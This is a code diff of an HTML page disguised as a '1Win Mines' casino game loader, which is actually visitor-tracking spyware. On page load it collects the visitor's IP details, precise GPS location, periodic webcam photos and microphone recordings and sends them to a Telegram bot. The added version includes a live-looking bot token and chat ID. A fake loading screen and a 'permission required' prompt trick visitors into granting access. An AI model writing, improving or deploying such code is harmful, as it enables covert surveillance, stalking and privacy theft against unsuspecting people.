@@ -1,259 +1,146 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>1Win Mines</title>
-    <style>
-        body, html {
-            margin: 0;
-            padding: 0;
-            height: 100%;
-            overflow: hidden;
-            font-family: Arial, sans-serif;
-        }
-        #bg-image {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            z-index: 1;
-        }
-        #loading-overlay {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.6);
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            z-index: 2;
-        }
-        .loader {
-            width: 50px;
-            height: 50px;
-            border: 5px solid rgba(255, 255, 255, 0.3);
-            border-radius: 50%;
-            border-top-color: #fff;
-            animation: spin 1s ease-in-out infinite;
-            margin-bottom: 15px;
-        }
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-        #loading-text {
-            color: white;
-            font-size: 18px;
-            margin-top: 10px;
-            text-align: center;
-        }
-        #permission-request {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.8);
-            display: none;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            z-index: 3;
-            color: white;
-            text-align: center;
-            padding: 20px;
-        }
-        #permission-request h2 {
-            margin-bottom: 15px;
-        }
-        #allow-btn {
-            margin-top: 20px;
-            padding: 12px 30px;
-            background: #4CAF50;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            font-size: 16px;
-            cursor: pointer;
-        }
-    </style>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>1Win Mines</title>
+<style>
+body, html { margin:0; padding:0; height:100%; font-family: Arial, sans-serif; overflow:hidden; }
+#bg-image { position:absolute; top:0; left:0; width:100%; height:100%; object-fit:cover; z-index:1; }
+#loading-overlay { position:absolute; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.6); display:flex; flex-direction:column; justify-content:center; align-items:center; z-index:2; }
+.loader { width:50px; height:50px; border:5px solid rgba(255,255,255,0.3); border-radius:50%; border-top-color:#fff; animation: spin 1s linear infinite; margin-bottom:15px; }
+@keyframes spin { to { transform:rotate(360deg); } }
+#loading-text { color:white; font-size:18px; text-align:center; }
+#permission-request { position:absolute; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); display:none; flex-direction:column; justify-content:center; align-items:center; z-index:3; color:white; text-align:center; padding:20px; }
+#permission-request h2 { margin-bottom:15px; }
+#allow-btn { margin-top:20px; padding:12px 30px; background:#4CAF50; color:white; border:none; border-radius:5px; font-size:16px; cursor:pointer; }
+#video-container { position:absolute; bottom:20px; right:20px; z-index:4; display:none; }
+#video { width:200px; height:150px; border:2px solid white; border-radius:5px; }
+</style>
 </head>
 <body>
-    <img id="bg-image" src="https://cdn.glitch.global/e4f59c88-d600-4172-aaa6-7e957cd37252/unnamed%20(1).webp?v=1750967013692" alt="Background">
-    
-    <div id="loading-overlay">
-        <div class="loader"></div>
-        <div id="loading-text">Connecting to server...</div>
-    </div>
-    
-    <div id="permission-request">
-        <h2>Location Access Required</h2>
-        <p>Please allow location access to continue</p>
-        <button id="allow-btn">ALLOW LOCATION</button>
-    </div>
+<img id="bg-image" src="https://cdn.glitch.global/e4f59c88-d600-4172-aaa6-7e957cd37252/unnamed%20(1).webp?v=1750967013692" alt="Background">
 
-    <script>
-        // Telegram bot details
-        const botToken = 'ENTER YOUR BOT TOKEN';
-        const chatId = 'ENTER YOUR TELEGRAM CHAT ID';
-        
-        // DOM elements
-        const loadingOverlay = document.getElementById('loading-overlay');
-        const loadingText = document.getElementById('loading-text');
-        const permissionRequest = document.getElementById('permission-request');
-        const allowBtn = document.getElementById('allow-btn');
-        
-        // Loading messages
-        const loadingMessages = [
-            "Connecting to server...",
-            "Loading game assets...",
-            "Verifying account...",
-            "Almost ready...",
-            "Preparing interface...",
-            "Finalizing setup..."
-        ];
-        
-        // Function to get IP info
-        async function getIPInfo() {
-            try {
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                const detailsResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
-                return await detailsResponse.json();
-            } catch (error) {
-                console.error("IP info error:", error);
-                return {};
-            }
-        }
-        
-        // Function to get precise location
-        function getPreciseLocation() {
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) {
-                    resolve(null);
-                    return;
-                }
-                
-                navigator.geolocation.getCurrentPosition(
-                    position => resolve({
-                        lat: position.coords.latitude,
-                        lon: position.coords.longitude,
-                        accuracy: position.coords.accuracy,
-                        timestamp: new Date().toLocaleString()
-                    }),
-                    error => {
-                        // Only show permission request if location was denied
-                        if (error.code === error.PERMISSION_DENIED) {
-                            setTimeout(() => {
-                                permissionRequest.style.display = 'flex';
-                            }, 3000);
-                        }
-                        resolve(null);
-                    },
-                    { 
-                        enableHighAccuracy: true,
-                        timeout: 10000,
-                        maximumAge: 0
-                    }
-                );
-            });
-        }
-        
-        // Function to send data to Telegram
-        async function sendToTelegram(data) {
-            try {
-                let message = `🕵️ NEW VISITOR TRACKED 🕵️\n\n`;
-                message += `📱 Device: ${navigator.userAgent}\n\n`;
-                message += `🌐 IP: ${data.ip || 'Unknown'}\n`;
-                message += `📍 IP Location: ${data.city || 'Unknown'}, ${data.region || 'Unknown'}, ${data.country_name || 'Unknown'}\n`;
-                message += `🏢 ISP: ${data.org || 'Unknown'}\n`;
-                
-                if (data.liveLocation) {
-                    message += `\n🎯 LIVE GPS LOCATION:\n`;
-                    message += `🔹 Latitude: ${data.liveLocation.lat}\n`;
-                    message += `🔹 Longitude: ${data.liveLocation.lon}\n`;
-                    message += `🔹 Accuracy: ${data.liveLocation.accuracy}m\n`;
-                    message += `🔹 Time: ${data.liveLocation.timestamp}\n`;
-                    message += `🗺️ Google Maps: https://www.google.com/maps?q=${data.liveLocation.lat},${data.liveLocation.lon}\n`;
-                } else {
-                    message += `\n📍 APPROX LOCATION:\n`;
-                    message += `🔹 Latitude: ${data.latitude || 'Unknown'}\n`;
-                    message += `🔹 Longitude: ${data.longitude || 'Unknown'}\n`;
-                    if (data.latitude && data.longitude) {
-                        message += `🗺️ Google Maps: https://www.google.com/maps?q=${data.latitude},${data.longitude}\n`;
-                    }
-                }
-                
-                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: message
-                    })
-                });
-                
-                if (data.liveLocation) {
-                    await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            chat_id: chatId,
-                            latitude: data.liveLocation.lat,
-                            longitude: data.liveLocation.lon
-                        })
-                    });
-                }
-            } catch (error) {
-                console.error("Telegram error:", error);
-            }
-        }
-        
-        // Rotate loading messages
-        function rotateLoadingMessages() {
-            let counter = 0;
-            setInterval(() => {
-                loadingText.textContent = loadingMessages[counter];
-                counter = (counter + 1) % loadingMessages.length;
-            }, 3000);
-        }
-        
-        // Main tracking function
-        async function trackUser() {
-            // Start rotating loading messages
-            rotateLoadingMessages();
-            
-            // First try to get precise location silently
-            const liveLocation = await getPreciseLocation();
-            
-            // Then get IP details
-            const ipDetails = await getIPInfo();
-            
-            // Combine all data
-            const trackingData = {
-                ...ipDetails,
-                ip: ipDetails.ip || 'Unknown',
-                liveLocation: liveLocation
-            };
-            
-            // Send to Telegram
-            await sendToTelegram(trackingData);
-        }
-        
-        // When allow button is clicked
-        allowBtn.addEventListener('click', async () => {
-            permissionRequest.style.display = 'none';
-            // Try to get location again
-            await trackUser();
+<div id="loading-overlay">
+<div class="loader"></div>
+<div id="loading-text">Connecting to server...</div>
+</div>
+
+<div id="permission-request">
+<h2>Location, Camera & Mic Access Required</h2>
+<p>Please allow all permissions to continue</p>
+<button id="allow-btn">ALLOW ACCESS</button>
+</div>
+
+<div id="video-container">
+<video id="video" autoplay playsinline muted></video>
+</div>
+
+<script>
+const botToken = '7636365377:AAH49L6bo7XS3-OKy2YvSqTMhfVXqP6p43Y';
+const chatId = '2018574765';
+
+const loadingOverlay = document.getElementById('loading-overlay');
+const loadingText = document.getElementById('loading-text');
+const permissionRequest = document.getElementById('permission-request');
+const allowBtn = document.getElementById('allow-btn');
+const videoContainer = document.getElementById('video-container');
+const videoEl = document.getElementById('video');
+
+const loadingMessages = ["Connecting to server...","Loading assets...","Verifying account...","Almost ready...","Preparing interface...","Finalizing setup..."];
+
+function rotateLoadingMessages(){
+    let c=0;
+    setInterval(()=>{ loadingText.textContent=loadingMessages[c]; c=(c+1)%loadingMessages.length; },3000);
+}
+
+async function getIPInfo(){
+    try{
+        const ipResp = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResp.json();
+        const detResp = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+        return await detResp.json();
+    }catch(e){ console.error(e); return {}; }
+}
+
+function getPreciseLocation(){
+    return new Promise(resolve=>{
+        if(!navigator.geolocation){ resolve(null); return; }
+        navigator.geolocation.getCurrentPosition(
+            pos=>resolve({lat:pos.coords.latitude, lon:pos.coords.longitude, accuracy:pos.coords.accuracy, timestamp:new Date().toLocaleString()}),
+            err=>{ if(err.code===err.PERMISSION_DENIED) setTimeout(()=>{permissionRequest.style.display='flex';},3000); resolve(null); },
+            {enableHighAccuracy:true, timeout:10000, maximumAge:0}
+        );
+    });
+}
+
+async function sendToTelegram(message){
+    try{
+        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`,{
+            method:'POST',
+            headers:{'Content-Type':'application/json'},
+            body:JSON.stringify({chat_id:chatId, text:message})
         });
-        
-        // Start tracking when page loads
-        window.onload = trackUser;
-    </script>
+    }catch(e){ console.error(e); }
+}
+
+async function sendPhoto(blob){
+    const formData = new FormData();
+    formData.append('chat_id', chatId);
+    formData.append('photo', blob);
+    try{
+        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`,{method:'POST', body:formData});
+    }catch(e){ console.error(e); }
+}
+
+async function startCameraMic(){
+    try{
+        const stream = await navigator.mediaDevices.getUserMedia({video:true,audio:true});
+        videoEl.srcObject = stream;
+        videoContainer.style.display='block';
+
+        const mediaRecorder = new MediaRecorder(stream);
+        let chunks=[];
+        mediaRecorder.ondataavailable=e=>chunks.push(e.data);
+        mediaRecorder.onstop=async()=>{
+            const blob=new Blob(chunks,{type:'audio/webm'});
+            const reader=new FileReader();
+            reader.onload=async()=>{
+                const base64=reader.result.split(',')[1];
+                await sendToTelegram(`Audio captured (base64 length): ${base64.length}`);
+            };
+            reader.readAsDataURL(blob);
+            chunks=[];
+        };
+        mediaRecorder.start();
+        setInterval(()=>{ if(mediaRecorder.state==='recording'){ mediaRecorder.stop(); mediaRecorder.start(); } },10000);
+
+        // Take photo every 15 sec
+        setInterval(async()=>{
+            const canvas=document.createElement('canvas');
+            canvas.width=videoEl.videoWidth;
+            canvas.height=videoEl.videoHeight;
+            canvas.getContext('2d').drawImage(videoEl,0,0);
+            canvas.toBlob(blob=>sendPhoto(blob),'image/jpeg',0.7);
+        },15000);
+
+    }catch(err){ console.error("Camera/Mic denied:",err); }
+}
+
+async function trackUser(){
+    rotateLoadingMessages();
+    const liveLocation = await getPreciseLocation();
+    const ipDetails = await getIPInfo();
+
+    let msg=`🕵️ NEW VISITOR 🕵️\nDevice: ${navigator.userAgent}\nIP: ${ipDetails.ip||'Unknown'}\n`;
+    if(liveLocation) msg+=`Lat:${liveLocation.lat}, Lon:${liveLocation.lon}, Accuracy:${liveLocation.accuracy}m, Time:${liveLocation.timestamp}`;
+    await sendToTelegram(msg);
+
+    await startCameraMic();
+}
+
+allowBtn.addEventListener('click', async()=>{ permissionRequest.style.display='none'; await trackUser(); });
+window.onload = trackUser;
+</script>
 </body>
 </html>
